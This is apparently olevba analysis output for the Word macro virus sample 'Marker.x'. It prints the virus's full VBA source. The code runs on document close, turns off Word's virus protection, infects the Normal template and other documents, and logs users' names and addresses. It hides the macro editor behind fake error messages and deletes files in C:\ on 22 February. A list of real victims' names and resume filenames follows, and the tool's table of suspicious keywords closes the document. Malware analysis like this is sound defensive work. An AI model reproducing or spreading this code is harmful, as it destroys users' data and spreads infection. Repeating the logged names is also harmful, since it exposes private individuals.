olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.x-849f548d2bb63b29acfbac94bcb0e8a2776f31b4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.x-849f548d2bb63b29acfbac94bcb0e8a2776f31b4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' Tester test.doc2/27/01 3:33:03 PM
Private Sub Document_Close()
' Tester test.doc2/27/01 3:33:03 PM
On Error Resume Next
' Tester test.doc2/27/01 3:33:03 PM
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' Tester test.doc2/27/01 3:33:03 PM
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' Tester test.doc2/27/01 3:33:03 PM
Dim ad, nt As Object
' Tester test.doc2/27/01 3:33:03 PM
Dim rep, x As Integer
' Tester test.doc2/27/01 3:33:03 PM
Dim virusCode, UserAddress, LogData, LogFile As String
' Tester test.doc2/27/01 3:33:03 PM
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' Tester test.doc2/27/01 3:33:03 PM
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' Tester test.doc2/27/01 3:33:03 PM
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' Tester test.doc2/27/01 3:33:03 PM
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' Tester test.doc2/27/01 3:33:03 PM
Options.VirusProtection = False
' Tester test.doc2/27/01 3:33:03 PM
Options.SaveNormalPrompt = True
' Tester test.doc2/27/01 3:33:03 PM
Delivery:
' Tester test.doc2/27/01 3:33:03 PM
If Day(Now()) = 22 And Month(Now()) = 2 Then
' Tester test.doc2/27/01 3:33:03 PM
Kill "C:\*.*":
' Tester test.doc2/27/01 3:33:03 PM
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' Tester test.doc2/27/01 3:33:03 PM
GoTo Delivery
' Tester test.doc2/27/01 3:33:03 PM
End If
' Tester test.doc2/27/01 3:33:03 PM
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' Tester test.doc2/27/01 3:33:03 PM
If DocumentInfected = True Then
' Tester test.doc2/27/01 3:33:03 PM
SaveNormalTemplate = NormalTemplate.Saved
' Tester test.doc2/27/01 3:33:03 PM
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' Tester test.doc2/27/01 3:33:03 PM
For i = 1 To Len(Application.UserAddress)
' Tester test.doc2/27/01 3:33:03 PM
If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
' Tester test.doc2/27/01 3:33:03 PM
If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
' Tester test.doc2/27/01 3:33:03 PM
UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
' Tester test.doc2/27/01 3:33:03 PM
End If
' Tester test.doc2/27/01 3:33:03 PM
Else
' Tester test.doc2/27/01 3:33:03 PM
UserAddress = UserAddress & Chr(13) & "' "
' Tester test.doc2/27/01 3:33:03 PM
End If
' Tester test.doc2/27/01 3:33:03 PM
Next i
' Tester test.doc2/27/01 3:33:03 PM
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' Tester test.doc2/27/01 3:33:03 PM
virusCode = virusCode & LogData
' Tester test.doc2/27/01 3:33:03 PM
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' Tester test.doc2/27/01 3:33:03 PM
nt.codemodule.AddFromString virusCode
' Tester test.doc2/27/01 3:33:03 PM
With nt.codemodule
' Tester test.doc2/27/01 3:33:03 PM
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' Tester test.doc2/27/01 3:33:03 PM
End With
' Tester test.doc2/27/01 3:33:03 PM
With nt.codemodule
' Tester test.doc2/27/01 3:33:03 PM
For x = 45 To 181 Step 2
' Tester test.doc2/27/01 3:33:03 PM
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' Tester test.doc2/27/01 3:33:03 PM
Next x
' Tester test.doc2/27/01 3:33:03 PM
End With
' Tester test.doc2/27/01 3:33:03 PM
If SaveNormalTemplate = True Then NormalTemplate.Save
' Tester test.doc2/27/01 3:33:03 PM
End If
' Tester test.doc2/27/01 3:33:03 PM
If NormalTemplateInfected = True Then
' Tester test.doc2/27/01 3:33:03 PM
SaveDocument = ActiveDocument.Saved
' Tester test.doc2/27/01 3:33:03 PM
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' Tester test.doc2/27/01 3:33:03 PM
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' Tester test.doc2/27/01 3:33:03 PM
ad.codemodule.AddFromString virusCode
' Tester test.doc2/27/01 3:33:03 PM
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' Tester test.doc2/27/01 3:33:03 PM
nt.codemodule.AddFromString virusCode
' Tester test.doc2/27/01 3:33:03 PM
ad.codemodule.Deletelines 174, 13
' Tester test.doc2/27/01 3:33:03 PM
With ad.codemodule
' Tester test.doc2/27/01 3:33:03 PM
For x = 45 To 181 Step 2
' Tester test.doc2/27/01 3:33:03 PM
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' Tester test.doc2/27/01 3:33:03 PM
Next x
' Tester test.doc2/27/01 3:33:03 PM
End With
' Tester test.doc2/27/01 3:33:03 PM
If SaveDocument = True Then ActiveDocument.Save
' Tester test.doc2/27/01 3:33:03 PM
End If
' Tester test.doc2/27/01 3:33:03 PM
End If
' Tester test.doc2/27/01 3:33:03 PM
Options.SaveNormalPrompt = False
' Tester test.doc2/27/01 3:33:03 PM
End Sub
' Tester test.doc2/27/01 3:33:03 PM
' Mike Pavluschick GoatW8-1.doc10.06.99 15:56:05
' Tester test.doc2/27/01 3:33:03 PM
' Mike Pavluschick GoatW8-1.doc10.06.99 15:56:05
' Tester test.doc2/27/01 3:33:03 PM
' Mike Pavluschick GoatW8-1.doc10.06.99 15:56:05
' Tester test.doc2/27/01 3:33:03 PM
' div.doc
' Tester test.doc2/27/01 3:33:03 PM
' This is it.doc

' Resume.doc

' Resume.doc

' AT.doc

' Document1

' Document1

' AT.DOC

' Proposal.doc

' Document1

' Document1

' Document1

' details.doc

' Resume.doc

' div.doc

' 05:08:00 PM -Monday,24 May,1999
' Siu Pang
'
' div.doc

' beatrix_kwan.doc

' slee.doc

' CV981125.doc

' MassoudW97.doc

' S4R_Int.doc

' Hotlist1.doc

' Roy Zornow resume.doc

' TK Move Manager.doc

' AU Business Manager.doc

' GDLUCK.DOC

' NOMURA.doc

' Operations Generalist.doc

' PBX Telecom Coordinator.doc

' resume.doc

' parm_meegada.doc

' Pramit.doc

' 03:29:30 PM -Thursday,27 May,1999
' Employee
'
' panda.doc

' zendeal2.doc

' Resume34.doc

' ted r doc_.doc

' gurman.doc

' RESUME37.doc

' Paul Smith002.doc

' WANG-W.DOC

' 1resumeAGurman.doc

' Chuck-res.doc

' cv3.doc

' resume38.doc

' BHARG-V.DOC

' flres1.doc

' sample1.doc

' Lawton updated resume.doc

' LEMERISE.DOC

' galianes.doc

' CVUK.doc

' word95_BinLi.doc

' Eduard 1.doc

' rakowski.doc

' DHRUVER.DOC

' 01:08:39 PM -Wednesday,16 Jun,1999
' DhruveR
'
' Dhruver.doc

' 6-15.doc

' DJI RESTORE.doc

' 03:58:39 PM -Wednesday,16 Jun,1999
' Tom Dziubek
'
' DJI RESTORE.doc

' FEC Script.doc

' OutlookDelegates.doc

' nite.doc

' sbranc01.doc

' newuser-djxpress.doc

' june_99.doc

' 02:01:37 PM -Monday,28 Jun,1999
' TozziT
'
' june_99.doc

' teammov1.doc

' 03:34:41 PM -Wednesday,7 Jul,1999
' DziubekT
'
' teammov11.doc

' Document2

' oneweek.doc

' oneweek.doc

' Document1

' twoweek.doc

' 4week.doc

' 03:48:34 PM -Thursday,1 Jul,1999
' Avert
'
' 4WEEK.DOC

' Doc2.doc

' 03:55:54  -÷åòâåðã,10 èþí,1999
' Mike Pavluschick
'
' marker-x.doc

' GoatW8-1.doc

' 03:32:45 PM -Tuesday,27 Feb,2001
' Tester
'
' 00013669.DOC

' test.doc

' test.doc

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
